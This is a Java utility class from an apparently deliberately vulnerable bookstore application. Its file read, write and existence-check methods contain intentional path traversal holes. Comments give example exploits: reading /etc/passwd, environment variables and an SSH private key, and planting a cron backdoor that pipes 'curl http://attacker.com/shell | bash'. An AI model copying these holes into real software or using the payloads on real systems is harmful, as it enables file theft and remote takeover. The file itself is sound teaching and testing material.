package com.vulnbookstore.util;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * Utility class for file I/O operations.
 * Used for reading book import files and writing export reports.
 *
 * Files are stored under the application's base data directory.
 */
public class FileUtil {

    private static final Logger logger = LoggerFactory.getLogger(FileUtil.class);

    // Base directory for application data files
    private static final String BASE_DIR = "/opt/bookstore/data/";

    /**
     * Read the contents of a file by name.
     *
     * ⚠️ VULNERABILITY: Path Traversal — the filename parameter is appended
     * directly to BASE_DIR without any sanitization or canonicalization.
     * An attacker can supply a filename like "../../etc/passwd" to read
     * arbitrary files outside the intended directory.
     *
     * Example exploit:
     *   readFile("../../etc/passwd")         → reads /etc/passwd
     *   readFile("../../proc/self/environ")  → reads environment variables
     *   readFile("../../../home/user/.ssh/id_rsa") → reads SSH private key
     *
     * Fix: use Path.normalize() and verify the result starts with BASE_DIR.
     * TODO: add path validation before reading
     *
     * @param filename the name of the file to read (relative to BASE_DIR)
     * @return file contents as a String
     */
    public static String readFile(String filename) {
        // ⚠️ VULNERABILITY: no path traversal protection
        String filePath = BASE_DIR + filename;
        logger.info("Reading file: {}", filePath);

        try {
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            return new String(bytes, StandardCharsets.UTF_8);
        } catch (IOException e) {
            logger.error("Failed to read file {}: {}", filePath, e.getMessage());
            throw new RuntimeException("Could not read file: " + filename, e);
        }
    }

    /**
     * Write a report to a file by name.
     *
     * ⚠️ VULNERABILITY: Path Traversal — same issue as readFile().
     * An attacker can write to arbitrary locations on the filesystem, potentially
     * overwriting configuration files, SSH authorized_keys, cron jobs, etc.
     *
     * Example exploit:
     *   writeReport("../../etc/cron.d/backdoor", "* * * * * root curl http://attacker.com/shell | bash")
     *   writeReport("../../../home/user/.ssh/authorized_keys", "<attacker-public-key>")
     *
     * TODO: add path validation before writing
     *
     * @param filename the name of the report file (relative to BASE_DIR)
     * @param content  the content to write
     */
    public static void writeReport(String filename, String content) {
        // ⚠️ VULNERABILITY: no path traversal protection
        String filePath = BASE_DIR + filename;
        logger.info("Writing report to: {}", filePath);

        try (BufferedWriter writer = new BufferedWriter(
                new FileWriter(filePath, StandardCharsets.UTF_8))) {
            writer.write(content);
        } catch (IOException e) {
            logger.error("Failed to write report {}: {}", filePath, e.getMessage());
            throw new RuntimeException("Could not write report: " + filename, e);
        }
    }

    /**
     * Check whether a data file exists.
     *
     * ⚠️ VULNERABILITY: Path Traversal — same issue; can be used to probe
     * for the existence of arbitrary files on the filesystem.
     */
    public static boolean fileExists(String filename) {
        // ⚠️ VULNERABILITY: no path traversal protection
        String filePath = BASE_DIR + filename;
        return Files.exists(Paths.get(filePath));
    }
}
